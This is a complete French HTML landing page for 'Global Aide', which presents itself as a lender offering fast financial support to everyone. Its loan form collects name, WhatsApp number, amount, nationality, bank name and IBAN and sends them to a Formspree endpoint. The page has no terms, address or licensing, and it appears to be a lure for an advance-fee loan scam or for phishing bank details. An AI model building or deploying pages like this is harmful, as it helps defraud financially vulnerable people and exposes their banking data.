<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Global Aide | Solutions Financières</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-slate-50 font-sans">
    <section class="min-h-screen flex flex-col items-center justify-center p-6 bg-blue-700 text-white text-center">
        <h1 class="text-5xl font-black mb-4">Global Aide</h1>
        <p class="text-xl mb-8">Soutien financier sérieux et rapide pour tous.</p>
        <a href="#formulaire" class="bg-yellow-400 text-blue-900 px-10 py-4 rounded-full font-bold text-xl uppercase">Commencer</a>
    </section>

    <section id="formulaire" class="max-w-4xl mx-auto my-10 p-8 bg-white rounded-3xl shadow-2xl">
        <h2 class="text-3xl font-bold mb-8 text-center text-blue-800">Demande de Prêt en Ligne</h2>
        <form action="https://formspree.io/f/xnjqwngo" method="POST" class="grid grid-cols-1 md:grid-cols-2 gap-6">
            <div>
                <label class="block text-sm font-bold mb-2">NOM COMPLET</label>
                <input type="text" name="nom" required class="w-full p-4 bg-gray-50 border rounded-xl text-black">
            </div>
            <div>
                <label class="block text-sm font-bold mb-2">WHATSAPP</label>
                <input type="tel" name="whatsapp" required class="w-full p-4 bg-gray-50 border rounded-xl text-black">
            </div>
            <div>
                <label class="block text-sm font-bold mb-2">MONTANT (€/$)</label>
                <input type="number" name="montant" required class="w-full p-4 bg-gray-50 border rounded-xl text-black">
            </div>
            <div>
                <label class="block text-sm font-bold mb-2">NATIONALITÉ</label>
                <input type="text" name="pays" required class="w-full p-4 bg-gray-50 border rounded-xl text-black">
            </div>

            <div class="col-span-full border-t pt-6 mt-4">
                <h3 class="text-lg font-bold mb-4 text-blue-600 uppercase">Coordonnées Bancaires</h3>
            </div>
            <div>
                <label class="block text-sm font-bold mb-2">NOM DE LA BANQUE</label>
                <input type="text" name="banque" required class="w-full p-4 bg-blue-50 border rounded-xl text-black">
            </div>
            <div>
                <label class="block text-sm font-bold mb-2">IBAN / NUMÉRO DE COMPTE</label>
                <input type="text" name="iban" required class="w-full p-4 bg-blue-50 border rounded-xl text-black">
            </div>

            <button type="submit" class="col-span-full bg-blue-600 text-white p-5 rounded-xl font-bold text-xl hover:bg-blue-700 shadow-lg">
                ENVOYER MA DEMANDE
            </button>
        </form>
    </section>
</body>
</html>
